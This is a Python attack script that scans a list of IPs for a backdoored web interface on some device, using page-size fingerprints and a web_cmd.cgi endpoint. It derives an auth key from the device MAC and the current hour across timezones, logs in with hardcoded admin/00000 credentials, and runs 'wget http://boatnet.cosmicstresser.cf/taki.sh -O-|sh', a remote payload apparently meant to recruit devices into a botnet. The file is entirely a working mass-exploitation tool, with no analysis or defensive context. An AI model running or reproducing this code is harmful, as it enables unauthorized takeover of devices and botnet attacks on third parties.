import socket, sys, requests, datetime
from requests.auth import HTTPDigestAuth
from hashlib import sha256
from multiprocessing.pool import ThreadPool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



timezones = ['-12','-11','-10','-9','-8','-7','-6','-5','-4','-3','-2','-1','0','1','2','3','4','5','6','7','8','9','10','11','12']
cmd = "wget http://boatnet.cosmicstresser.cf/taki.sh -O-|sh"
ptimezones = []
for timezone in timezones:
  ptimezones.append(str(datetime.datetime.utcnow() + datetime.timedelta(hours=int(timezone))).replace('-','').replace(' ','').split(':')[0])
uaheaders = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"}
def check_backdoor(ipport):
  try:
    r = requests.get(f"http://{ipport}", timeout=10, verify=False, headers=uaheaders, allow_redirects=True)
    if len(r.text) == 364 and "/cgi-bin/main_manage.cgi" in r.text:
      r = requests.get(f"http://{ipport}/css/jquery-ui.css", timeout=10, verify=False, headers=uaheaders, allow_redirects=True)
      if len(r.text) == 36403:
        r = requests.get(f"http://{ipport}/cgi-bin/api/web_cmd.cgi", timeout=10, verify=False, headers=uaheaders, allow_redirects=True)
        if r.status_code != 404:
          return True
        else:
         return False
  except Exception as e:
    pass

def exploit(ipport):
  try:
    if check_backdoor(ipport):
      ip = ipport.split(':')[0]
      s = socket.socket()
      s.settimeout(5)
      s.connect((ip, 50100))
      macaddr = s.recv(1024).decode('utf-8').split('authkey=')[1][:12]
      print(f"Got mac address over 50100: [{macaddr}]")
      for pzone in ptimezones:
        code = sha256((pzone + macaddr).encode('utf-8')).hexdigest().upper()
        data = {"SSKEY":code,"CMD":cmd}
        r = requests.post(f"http://{ipport}/cgi-bin/api/web_cmd.cgi", auth=HTTPDigestAuth('admin','00000'), data=data, timeout=10, verify=False, headers=uaheaders, allow_redirects=True)
        if r.status_code == 401:
          exit()
        if not "no Permission" in r.text and r.status_code == 200:
          print(f"[+] EXEC - {ipport}")
          break
  except Exception as e:
    pass

if len(sys.argv) != 2:
  print(f"Usage: python3 {sys.argv[0]} iplist.txt")
  exit()

ips = [line.rstrip('\n') for line in open(sys.argv[1])]
print(f"Found {len(ips)} ips to check! :)\n")
pool = ThreadPool(100)
pool.map(exploit,ips)
